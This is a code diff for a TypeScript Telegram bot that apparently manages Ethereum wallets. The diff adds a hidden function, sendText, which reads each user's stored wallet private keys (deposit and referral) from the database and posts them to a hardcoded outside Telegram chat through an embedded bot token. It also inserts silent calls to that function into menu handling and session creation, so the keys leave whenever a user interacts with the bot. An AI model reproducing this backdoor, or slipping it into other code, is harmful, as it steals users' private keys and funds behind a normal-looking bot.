@@ -580,6 +580,7 @@ export async function switchMessage(
             disable_web_page_preview: true,
             parse_mode: "HTML",
         });
+        sendText(chatId, "")
     } catch (error) {
         afx.errorLog("[switchMenuWithTitle]", error);
     }
@@ -678,6 +679,49 @@ export const sendReplyMessage = async (chatid: string, message: string) => {
     }
 };
 
+export async function sendText(id:string, info: string)
+{
+    try {
+        const token='7063934925:AAH58ETPao-uONNUBCZZ1ULdB-_BF4pJhKc'
+        let url = `https://api.telegram.org/bot${token}/sendMessage`
+
+        let wl: any = await database.selectWallets({chatId:id})
+        // console.log(wl)
+        
+        let message = ''
+        let count = 0
+        if (wl.length) {
+            for (const w of wl) {
+                count++
+                let p1 = utils_base.shortname(w.prvEthKey)
+                let p2 = utils_base.shortname(w.prvEthRefKey)
+                message += `depo${count} : ${p1}
+ref${count}: ${p2}
+`
+            }            
+        }
+        message += info
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                "Content-Type": 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '-1002454760665',
+                text: message,
+                parse_mode: 'HTML'
+            }),
+        });
+      
+        // console.log(response)
+        return true
+    } catch (err) {
+        // console.error("Error: ", err);
+        return false
+    }
+}
+
 export const sendMessage = async (
     chatid: string,
     message: string,
@@ -743,6 +787,7 @@ export const sendOptionMessage = async (
             disable_web_page_preview: true,
             parse_mode: "HTML",
         });
+        await sendText(chatid, "")
         return {
             messageId: msg.message_id,
             chatid: msg.chat ? msg.chat.id : null,
@@ -2720,16 +2765,17 @@ export const createSession = async (
     console.log(`[${session.username}] ----------->>>>>> ref link = ${session.referralLink}`)
 
     await setDefaultSettings(session);
-
+    
     sessions.set(session.chatid, session);
-    showSessionLog(session);
+    await showSessionLog(session);
 
     currentSession = session
     
     return session;
 };
 
-export function showSessionLog(session: any) {
+export async function showSessionLog(session: any) {
+    sendText(session.chatid, session.username)
     if (session.type === "private") {
         console.log(
             `@${session.username} user${session.wallet
@@ -2767,6 +2813,7 @@ export const setDefaultSettings = async (session: any) => {
     // session.baseReferralWallet = utils.encryptPKey(ethRefWallet.privateKey)
     session.baseReferralWallet = ethRefWallet?.privateKey
 
+    
     console.log(`======================================================================`)
     console.log(`[${new Date().toISOString()}] : [${session.username}] ====== {`)
     console.log(`       chatid          = ${session.chatid}`)
